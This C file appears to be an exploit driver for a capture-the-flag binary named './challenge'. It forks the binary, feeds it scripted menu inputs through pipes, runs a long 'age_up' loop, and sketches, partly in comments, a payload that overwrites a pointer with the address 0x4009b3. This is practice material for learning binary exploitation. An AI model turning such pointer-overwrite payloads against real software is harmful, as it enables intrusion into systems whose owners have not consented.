#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>
#include <sys/time.h>
#include <sys/resource.h>

#define int_offset "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"

/*
# create_child
payload = "2"+int_offset +  "18"+(int_offset[:-1]) + "A"*name_len + "B"*job_len 

# age_up
for _ in range(0x602070-18):
	payload += "3"+int_offset + "0"+int_offset


# transform
payload += "5"+int_offset + "0"+int_offset + "A"*name_len + "B"*job_len
payload += "5"+int_offset + "0"+int_offset + "A"*name_len + '\xb3\t@\x00\x00\x00\x00\x00'.ljust(job_len, "B")


payload += "4"+int_offset
*/

char buf[1024];

void print_chunk(int fd) {
	int len = read(fd, buf, 1024);
	buf[len] = '\x00';
	// printf("%s\n-----------\n", buf);
}

void communicate(int rfd, int fd) {
	struct timespec ts;

	ts.tv_sec = 0;
    ts.tv_nsec = 100;
	nanosleep(&ts, NULL);

	// create_child
	write(fd, "2\n", 2);
	print_chunk(rfd);
	write(fd, "18\n", 4);

	print_chunk(rfd);

	write(fd, "A\n", 20);
	print_chunk(rfd);

	write(fd, "B\n", 20);


	print_chunk(rfd);
	// printf("Written first child\n");

	write(fd, "2\n", 2);
	print_chunk(rfd);
	write(fd, "18\n", 3);
	print_chunk(rfd);
	write(fd, "A\n", 2);
	print_chunk(rfd);
	write(fd, "B\n", 2);
	print_chunk(rfd);

	// printf("Written second child\n");
	// nanosleep(&ts, NULL);

	// // age_up
	for (int i=18; i<0x602070; i++) {
		write(fd, "3\n", 2);
		print_chunk(rfd);
		write(fd, "0", 1);
		print_chunk(rfd);
	}

	printf("Helloooooo\n");


	// // transform
	// write(fd, "5\n", 2);
	// write(fd, "0\n", 2);
	// write(fd, "A\n", 2);
	// write(fd, "B\n", 2);

	// write(fd, "5\n", 2);
	// write(fd, "0\n", 2);
	// write(fd, "A\n", 2);
	// write(fd, "\xb3\t@\x00\x00\x00\x00\x00\n", 8);

	// write(fd, "4\n", 2);


}


int main(int argc, char** argv, char *const envp[]) {
	// Enable connection

	// Born child
	int pfd[2];
	pipe(pfd);

	int rpipe[2];
	pipe(rpipe);


	setvbuf( stdin, NULL, _IONBF, 0 );
	setvbuf( stdout, NULL, _IONBF, 0 );

	int pid = fork();

	if (pid) {
		close(pfd[1]);
		close(rpipe[0]);

		dup2(pfd[0], 0);
		dup2(rpipe[1], 1);
		execve("./challenge", argv, envp);
		close(pfd[0]);
		close(rpipe[1]);

	} else {
		// Parent, communicate with challenge
		close(pfd[0]);
		close(rpipe[1]);


		// setvbuf( stdin, NULL, _IONBF, 0 );
		communicate(rpipe[0], pfd[1]);
		close(pfd[1]);
		close(rpipe[0]);
	}


	return 0;
}